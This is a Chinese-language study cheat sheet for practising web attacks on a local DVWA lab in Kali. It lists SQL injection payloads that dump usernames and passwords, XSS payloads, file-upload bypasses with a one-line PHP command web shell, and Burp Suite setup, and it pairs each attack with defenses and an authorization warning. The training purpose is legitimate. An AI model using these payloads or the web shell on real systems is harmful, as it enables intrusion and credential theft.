## 1. 环境

### 1.1 Kali 常用命令

```bash
sudo systemctl start mariadb        # 启动数据库
sudo systemctl status mariadb       # 看数据库状态
ss -tlnp | grep 8080                # 看谁占着 8080
sudo poweroff                       # 正常关机
```

### 1.2 启动 DVWA

```bash
cd /opt/dvwa
sudo php -d auto_prepend_file=/opt/dvwa/prepend.php -S 0.0.0.0:8080
```

> 这个终端窗口要一直开着，关了网站就停。
> 浏览器访问 `http://127.0.0.1:8080`，账号 `admin` / `password`。

### 1.3 VirtualBox 操作

| 操作 | 位置 |
|---|---|
| 拍快照 | 菜单「机器 → 拍摄快照」 |
| 正常关机 | 菜单「控制 → 发送关机信号」 |
| 强制关机（最后手段） | 菜单「控制 → 关闭电源」 |
| 改内存/CPU | 设置 → 系统 |
| 关 3D 加速 | 设置 → 显示 |

### 1.4 Kali 访问宿主机

VirtualBox NAT 模式下，宿主机的地址固定是 **`10.0.2.2`**。

```bash
# 宿主机开了 python -m http.server 8000 时
wget http://10.0.2.2:8000/文件名
```

## 2. SQL 注入

### 2.1 一句话原理

用户输入被直接拼进 SQL 字符串，**数据被当成代码执行**。

### 2.2 怎么发现（三步）

```
1          → 正常返回
1'         → 报错  = 有注入点
1' OR '1'='1 → 返回全表 = 条件被绕过
```

### 2.3 核心 payload

| 目的 | payload |
|---|---|
| 测列数 | `1' ORDER BY 2#`（报错说明列数不够） |
| 拖账号密码 | `1' UNION SELECT user, password FROM users#` |
| 拖表名 | `1' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database()#` |
| 拖列名 | `1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'#` |

**注释符**：`#`（MySQL）或 `-- `（后面必须有空格）。

### 2.4 没有回显时

```
# 布尔盲注：看页面是否不同
1' AND SUBSTRING(database(),1,1)='d'#

# 时间盲注：看响应是否变慢
1' AND SLEEP(5)#

# 报错注入：让错误信息带出数据
1' AND extractvalue(1,concat(0x7e,version()))#
1' AND updatexml(1,concat(0x7e,version()),1)#
```

### 2.5 怎么防

**参数化查询**（PDO `prepare` + `bindParam`）+ 输入校验 + 最小权限 + 关闭详细报错。

## 3. XSS

### 3.1 三种类型

| 类型 | 特征 | 测试方法 |
|---|---|---|
| 反射型 | 参数在 URL，回显到页面 | `?name=<script>alert(1)</script>` |
| 存储型 | 内容存进数据库 | 提交评论后刷新仍弹窗 |
| DOM 型 | 前端 JS 直接拼接 | 找 `innerHTML`、`document.write` |

### 3.2 常用 payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
```

### 3.3 怎么防

**输出编码**（HTML 实体）+ CSP + 输入校验 + Cookie 加 HttpOnly。

## 4. 文件上传

### 4.1 各等级怎么绕

| 等级 | 它检查什么 | 绕过思路 |
|---|---|---|
| Low | 什么都不查 | 直接传 `shell.php` |
| Medium | Content-Type | Burp 改成 `image/jpeg` |
| High | 图片头 + 后缀白名单 | 图片马（有效图片 + PHP 代码），配合文件包含执行 |
| Impossible | 重命名 + 内容校验 | 无通用绕过 |

### 4.2 测试用的 shell

```php
<?php system($_GET['cmd']); ?>
```

访问：`http://目标/shell.php?cmd=whoami`

### 4.3 怎么防

白名单后缀 + 重命名 + 存到 Web 目录外 + 禁止解析 + 校验文件内容。

## 5. Burp Suite

### 5.1 配置

- Burp 监听用 **8081**（8080 留给靶场，别抢）
- 浏览器代理 `127.0.0.1:8081`，勾 HTTPS，**No proxy for 清空**
- Burp 监听列表里 **Running 必须打勾**，否则浏览器报 refusing connections

### 5.2 常用操作

| 操作 | 方法 |
|---|---|
| 抓包 / 放行 | Intercept is on → Forward |
| 改包重放 | 请求右键 → Send to Repeater（`Ctrl + R`） |
| 爆破 | 请求右键 → Send to Intruder |
| 编解码 | Decoder 标签 |
| 看历史 | Proxy → HTTP history |

### 5.3 标准流程

```
设代理 → 开拦截 → 访问目标 → 改包或 Forward → 看响应
```

### 5.4 抓不到包？按这个顺序查

| 现象 | 检查 | 解决 |
|---|---|---|
| 所有网页都打不开 | Burp 是否在跑、监听端口 | 启动 Burp，勾 Running |
| `refusing connections` | 端口对不上 | 浏览器端口 = Burp 监听端口 |
| 页面能开但 history 空白 | 目标是不是 localhost/127.0.0.1 | 换假域名：`echo "127.0.0.1 dvwa.test" \| sudo tee -a /etc/hosts` |
| 页面一直转圈 | Intercept 开着 | 切到 off 或点 Forward |
| 有 CONNECT 请求无内容 | 访问的是 HTTPS | 需要装 Burp CA 证书 |

## 6. 编码与哈希

### 6.1 常用命令

```bash
echo -n "password" | md5sum
echo -n "password" | sha256sum
echo "dGVzdA==" | base64 -d
```

### 6.2 工具

| 需求 | 工具 |
|---|---|
| 万能编码转换 | CyberChef（网页版） |
| MD5 反查 | crackstation.net / cmd5.com |
| Base64 | 命令行或浏览器插件 |

### 6.3 一个认知

MD5 是**哈希不是加密，不可逆**。「解密」靠彩虹表反查——**弱密码一秒出结果**。
所以密码存储要用 bcrypt / Argon2 加盐。

## 9. 安全纪律

- 只在**自己的靶场**或**有书面授权**的目标上测试
- 未经授权测试真实系统，可能触犯《刑法》285、286 条
- 拿到数据不外传、不滥用
